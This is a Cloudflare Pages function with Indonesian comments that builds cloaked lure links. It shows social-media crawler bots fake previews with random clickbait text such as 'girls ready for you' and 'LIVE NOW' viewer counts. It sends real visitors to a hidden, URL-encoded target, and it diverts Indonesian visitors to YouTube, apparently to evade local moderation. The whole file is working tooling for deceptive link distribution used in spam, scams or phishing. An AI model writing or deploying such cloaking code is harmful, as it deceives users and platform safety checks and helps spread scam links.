export async function onRequest(context) {
    const { params, request } = context;
    const base64Data = params.path[0];
    const userAgent = request.headers.get("user-agent") || "";
    
    // Cloudflare Geolocation (Deteksi Negara)
    const country = request.cf ? request.cf.country : "Unknown";

    if (!base64Data || base64Data === "index.html") {
        return context.next();
    }

    try {
        // 1. DECODE DATA DARI URL
        const data = JSON.parse(atob(base64Data));
        const title = data.t || "Premium Content";
        const image = data.i || "";
        const target = data.u || "";

        // 2. GENERATE RANDOM DESKRIPSI & TEMA (Play, Dollar, VIP, dll)
        const count = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
        const formattedCount = count.toLocaleString('en-US');
        
        const themes = [
            { d: `▶️ ${formattedCount} girls ready for you...`, type: "video.other" },
            { d: `💰 Premium Access: ${formattedCount} girls online`, type: "website" },
            { d: `💎 Exclusive Content: ${formattedCount} active members`, type: "website" },
            { d: `🔴 LIVE NOW: ${formattedCount} viewers watching`, type: "video.other" },
            { d: `📥 Download File (${formattedCount} MB) - Fast Link`, type: "website" }
        ];
        
        const s = themes[Math.floor(Math.random() * themes.length)];
        const isBot = /WhatsApp|facebookexternalhit|TelegramBot|Twitterbot|Slackbot/i.test(userAgent);

        // 3. TAMPILAN KHUSUS BOT (Preview Sosmed)
        if (isBot) {
            return new Response(`<!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>${title}</title>
                <meta property="og:title" content="${title}" />
                <meta property="og:description" content="${s.d}" />
                <meta property="og:image" content="${image}" />
                
                <meta property="og:image:width" content="1200" />
                <meta property="og:image:height" content="630" />
                <meta name="twitter:card" content="summary_large_image">
                <meta name="twitter:image" content="${image}">
                
                <meta property="og:type" content="${s.type}" />
                <meta property="og:video:url" content="${image}" /> 
                <meta property="og:video:type" content="text/html" />
            </head>
            <body style="background:#000;"></body>
            </html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
        }

        // 4. LOGIC REDIRECT MANUSIA (User Asli)
        let finalTarget = target.trim();
        
        if (country === "ID") {
            // Jika orang Indonesia, paksa masuk ke YouTube
            finalTarget = "https://www.youtube.com"; 
        } else {
            // Jika luar Indonesia, masuk ke link asli yang di-input
            if (!/^https?:\/\//i.test(finalTarget)) {
                finalTarget = 'https://' + finalTarget;
            }
        }

        return Response.redirect(finalTarget, 302);

    } catch (e) {
        return context.next();
    }
}
